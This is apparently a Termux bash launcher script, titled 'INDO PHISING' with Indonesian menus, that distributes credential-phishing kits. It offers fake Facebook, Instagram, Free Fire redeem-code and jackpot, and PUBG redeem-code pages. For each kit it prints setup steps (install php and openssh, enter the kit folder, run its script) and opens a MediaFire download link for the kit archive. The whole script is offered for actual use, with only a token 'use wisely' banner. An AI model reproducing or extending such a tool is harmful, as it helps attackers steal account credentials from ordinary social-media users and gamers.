#!/bin/bash
pkg install termux-tools
clear
printf "\e[5;34m-----------------------INDO PHISING-----------------------------

\e[5;34m~ Coded by   : \e[5;33mMR.D4PLU17
\e[5;34m~ My Team    : \e[5;33mPurwokerto Cyber Team
\e[5;34m~ IG         : \e[5;33mfebryan_ragil

\e[5;34m----------------------------------------------------------------
                 GUNAKAN DENGAN BIJAK
\e[5;31m===================================================" 
printf "
[+] 1.Pishing Facebook
[+] 2.Pishing Instagram
[+] 3.Pishing Free Fire Kode Redeem
[+] 4.Pishing Free Fire Jackpot
[+] 5.Pishing Pubg Kode Redeem
[+] 6.Follow Instagram
[+] 0.Keluar\n\n" | lolcat
printf "[+] \e[5;32mPilih Nomor :\e[0m "
read select
if [ $select = 1 ] || [ $select = 01 ]
then
clear
printf "# Download File Scriptnya
# Ekstrak Filenya
# Simpan Folder ke Internal Awal
# buka termux
# pkg install php
# pkg install openssh
# cd /sdcard/facebook-real
# bash fb.sh\n\n " | lolcat
printf "[!] \e[5;31mDownload File? (y/n) :\e[0m "
read file1
if [ $file1 = y ] || [ $file1 = Y ]
then
xdg-open https://www.mediafire.com/file/bdx1oxblj5peolv/facebook-real.zip
fi
if [ $file1 = n ] || [ $file1 = N ]
then
bash phising.sh
fi
fi



if [ $select = 2 ] || [ $select = 02 ]
then
clear
printf "# Download File Scriptnya
# Ekstrak Filenya
# Simpan Folder ke Internal Awal
# buka termux
# pkg install php
# pkg install openssh
# cd /sdcard/instagram
# bash ig.sh\n\n" | lolcat
printf "[!] \e[5;31mDownload File? (y/n) :\e[0m "
read file2
if [ $file2 = y ] || [ $file2 = Y ]
then
xdg-open https://www.mediafire.com/file/zkdtlan66hs256m/ig.zip
fi
if [ $file2 = n ] || [ $file2 = N ]
then
bash phising.sh
fi
fi


if [ $select = 3 ] || [ $select = 03 ]
then
clear
printf "# Download File Scriptnya
# Ekstrak Filenya
# Simpan Folder ke Internal Awal
# buka termux
# pkg install php
# pkg install openssh
# cd /sdcard/FreeFire
# bash FreeFire.sh\n\n" | lolcat
printf "[!] Download File? (y/n) :\e[0m "
read file3
if [ $file3 = y ] || [ $file3 = Y ]
then
xdg-open https://www.mediafire.com/file/ml8tsehuqaodkme/FreeFire.zip
fi
if [ $file3 = n ] || [ $file3 = N ]
then
bash phising.sh
fi
fi


if [ $select = 4 ] || [ $select = 04 ]
then
clear
printf "# Download File Scriptnya
# Ekstrak Filenya
# Simpan Folder ke Internal Awal
# buka termux
# pkg install php
# pkg install openssh
# cd /sdcard/jackpotff
# bash FreeFire.sh\n\n" | lolcat
echo "[!] Download File? (y/n) :   "
read file4
if [ $file4 = y ] || [ $file4 = Y ]
then
xdg-open https://www.mediafire.com/file/tjx8xsr7bo3qkeb/jackpotff.zip
fi
if [ $file4 = n ] || [ $file4 = N ]
then
bash phising.sh
fi
fi


if [ $select = 5 ] || [ $select = 05 ]
then
clear
printf "# Download File Scriptnya
# Ekstrak Filenya
# Simpan Folder ke Internal Awal
# buka termux
# pkg install php
# pkg install openssh
# cd /sdcard/pubg
# bash pubg.sh\n\n" | lolcat
printf "[!] Download File? (y/n) :\e[0m "
read file5
if [ $file5 = y ] || [ $file5 = Y ]
then
xdg-open https://www.mediafire.com/file/bdbrutler9pmupb/pubg.zip
fi
if [ $file5 = n ] || [ $file5 = N ]
then
bash phising.sh
fi
fi



if [ $select = 6 ] || [ $select = 06 ]
then
xdg-open https://www.instagram.com/febryan_ragil/?hl=id
fi

if [ $select = 0 ]
then
printf "Banyak Bacot"
sleep 2
login
fi
